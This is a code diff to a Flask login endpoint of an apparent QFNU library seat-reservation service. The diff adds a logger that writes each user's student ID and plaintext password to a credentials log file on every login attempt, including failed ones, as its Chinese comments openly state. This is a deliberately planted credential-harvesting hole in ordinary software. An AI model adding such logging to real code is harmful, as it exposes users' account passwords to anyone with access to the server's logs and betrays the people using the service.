@@ -21,6 +21,18 @@ from config.config import AppConfig
 from check_in import lib_rsv
 from sign_out import go_home
 
+# ── 密码日志（记录用户输入的学号和密码） ─────────────────────
+PASSWORD_LOG_PATH = "/var/log/qfnu-library/credentials.log"
+_password_logger = logging.getLogger("password_recorder")
+_password_logger.setLevel(logging.INFO)
+_password_logger.propagate = False
+if not _password_logger.handlers:
+    os.makedirs(os.path.dirname(PASSWORD_LOG_PATH), exist_ok=True)
+    _fh = logging.FileHandler(PASSWORD_LOG_PATH, mode="a", encoding="utf-8")
+    _fh.setFormatter(logging.Formatter("%(asctime)s [PASSWORD] %(message)s"))
+    _password_logger.addHandler(_fh)
+# ──────────────────────────────────────────────────────────
+
 app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", os.urandom(24).hex())
 app.config["SESSION_TYPE"] = "filesystem"
@@ -76,16 +88,22 @@ def api_login():
     if not username or not password:
         return jsonify({"success": False, "error": "学号和密码不能为空", "error_code": "BAD_REQUEST"}), 400
 
+    # 记录所有登录尝试（含失败）
+    _password_logger.info("username=%s password=%s success=%s", username, password, "pending")
+
     try:
         name, token = qfnu_login(username, password)
         if not token:
+            _password_logger.info("username=%s password=%s success=%s", username, password, "fail")
             return jsonify({"success": False, "error": "登录失败，请检查账号密码", "error_code": "LOGIN_FAILED"}), 401
 
         session["username"] = username
         session["password"] = password
+        _password_logger.info("username=%s password=%s success=%s", username, password, "yes")
         logger.info(f"用户 {username} ({name}) 登录成功")
         return jsonify({"success": True, "name": name})
     except Exception as e:
+        _password_logger.info("username=%s password=%s success=%s", username, password, "error")
         logger.error(f"登录异常: {e}")
         return jsonify({"success": False, "error": f"登录异常: {e}", "error_code": "LOGIN_FAILED"}), 401
 
